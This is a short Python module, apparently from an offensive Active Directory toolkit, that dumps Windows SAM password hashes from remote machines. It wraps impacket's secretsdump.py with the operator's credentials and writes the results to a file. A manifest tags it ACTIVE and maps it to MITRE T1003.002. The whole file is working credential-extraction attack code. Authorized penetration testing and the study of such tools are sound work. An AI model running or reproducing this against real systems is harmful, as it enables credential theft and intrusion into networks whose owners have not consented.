"""SAM hashes multi-machine dump via remote registry."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.credential.sam_dump.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["credential_extraction", "registry_access"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.002"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    target = getattr(args, "target", None)

    print("[*] SAM Hash Dump: {}".format(target or "target"))

    import subprocess
    import shutil
    secretsdump = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if not secretsdump:
        print("[!] secretsdump.py (impacket) not found")
        return 1

    auth = cred.impacket_auth_string()
    cmd = [secretsdump, auth + "@" + (target or ""), "-sam",
           "-outputfile", getattr(args, "output", ".") + "/sam_dump"]

    print("[*] CMD: {}".format(" ".join(cmd)))
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)
    if result.returncode != 0:
        print(result.stderr)
    return result.returncode
